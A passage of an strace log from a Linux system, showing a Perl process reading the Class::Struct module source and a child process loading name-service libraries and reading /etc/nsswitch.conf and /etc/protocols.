\'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
12710 07:43:45.456958 brk(0x82de000)    = 0x82de000
12710 07:43:45.457315 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
12710 07:43:45.470322 _llseek(10, 6916, [6916], SEEK_SET) = 0
12710 07:43:45.470340 _llseek(10, 0, [6916], SEEK_CUR) = 0
12710 07:43:45.470351 close(10)         = 0
12710 07:43:45.470532 _llseek(8, 1334, [1334], SEEK_SET) = 0
12710 07:43:45.470548 _llseek(8, 0, [1334], SEEK_CUR) = 0
12710 07:43:45.470559 close(8)          = 0
12710 07:43:45.471150 brk(0x82ff000)    = 0x82ff000
12710 07:43:45.479170 _llseek(6, 2689, [2689], SEEK_SET) = 0
12710 07:43:45.479170 _llseek(6, 0, [2689], SEEK_CUR) = 0
12710 07:43:45.479170 close(6)          = 0
12710 07:43:45.479319 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e06908) = 12711
12711 07:43:45.489919 getppid()         = 12710
12711 07:43:45.490436 open("/etc/nsswitch.conf", O_RDONLY) = 6
12711 07:43:45.499169 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12711 07:43:45.499169 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fcc000
12711 07:43:45.499170 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12711 07:43:45.499170 read(6, "", 4096) = 0
12711 07:43:45.499170 close(6)          = 0
12711 07:43:45.499170 munmap(0xb7fcc000, 4096) = 0
12711 07:43:45.499171 open("/etc/ld.so.cache", O_RDONLY) = 6
12711 07:43:45.499180 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12711 07:43:45.499197 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7dd3000
12711 07:43:45.499208 close(6)          = 0
12711 07:43:45.499219 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12711 07:43:45.499237 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499251 stat64("/lib/tls/i686/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499265 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499279 stat64("/lib/tls/i686/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499290 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499303 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12711 07:43:45.499321 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499334 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12711 07:43:45.499351 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499364 stat64("/lib/tls/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499375 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499387 stat64("/lib/tls/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499398 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499411 stat64("/lib/tls/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499437 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499477 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12711 07:43:45.499536 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499550 stat64("/lib/i686/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499561 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499574 stat64("/lib/i686/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499585 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499597 stat64("/lib/i686/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499608 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499619 stat64("/lib/i686", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499630 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499642 stat64("/lib/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499653 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499665 stat64("/lib/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499675 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499687 stat64("/lib/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499701 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499713 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12711 07:43:45.499730 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499743 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499754 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499767 stat64("/usr/lib/tls/i686/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499779 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499791 stat64("/usr/lib/tls/i686/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499803 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499815 stat64("/usr/lib/tls/i686", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499826 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499839 stat64("/usr/lib/tls/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499850 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499862 stat64("/usr/lib/tls/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499874 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499886 stat64("/usr/lib/tls/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499897 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499909 stat64("/usr/lib/tls", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499928 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.499968 stat64("/usr/lib/i686/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.499995 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500008 stat64("/usr/lib/i686/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500020 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500033 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12711 07:43:45.500051 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500064 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12711 07:43:45.500094 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500107 stat64("/usr/lib/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500118 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500130 stat64("/usr/lib/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500141 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500153 stat64("/usr/lib/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500164 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500176 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
12711 07:43:45.500193 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500206 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500219 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500233 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500248 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500261 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500274 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500287 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500299 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500312 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500324 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500337 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500349 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500361 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500373 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500393 stat64("/lib/i486-linux-gnu/tls", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500405 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500419 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500431 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500444 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500456 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500469 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500481 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500494 stat64("/lib/i486-linux-gnu/i686", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500506 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500519 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500531 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500544 stat64("/lib/i486-linux-gnu/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500555 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500568 stat64("/lib/i486-linux-gnu/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500580 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500592 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12711 07:43:45.500610 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500624 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500637 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500650 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500663 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500677 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500692 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500705 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500717 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500731 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500743 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500756 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500769 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500782 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500794 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500807 stat64("/usr/lib/i486-linux-gnu/tls", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500818 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500832 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500845 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500858 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500870 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500889 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500902 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500959 stat64("/usr/lib/i486-linux-gnu/i686", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500971 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.500985 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.500997 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.501010 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.501022 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.501035 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbf8eed8c) = -1 ENOENT (No such file or directory)
12711 07:43:45.501047 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12711 07:43:45.501059 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12711 07:43:45.501079 munmap(0xb7dd3000, 29913) = 0
12711 07:43:45.501099 open("/etc/ld.so.cache", O_RDONLY) = 6
12711 07:43:45.501112 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12711 07:43:45.501129 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7dd3000
12711 07:43:45.501139 close(6)          = 0
12711 07:43:45.501150 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12711 07:43:45.501165 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
12711 07:43:45.501180 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12711 07:43:45.501274 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12711 07:43:45.501296 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7dc8000
12711 07:43:45.501308 mmap2(0xb7dd1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7dd1000
12711 07:43:45.501325 close(6)          = 0
12711 07:43:45.501348 munmap(0xb7dd3000, 29913) = 0
12711 07:43:45.501365 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
12711 07:43:45.501381 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12711 07:43:45.501396 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
12711 07:43:45.501421 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dda000
12711 07:43:45.501433 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header 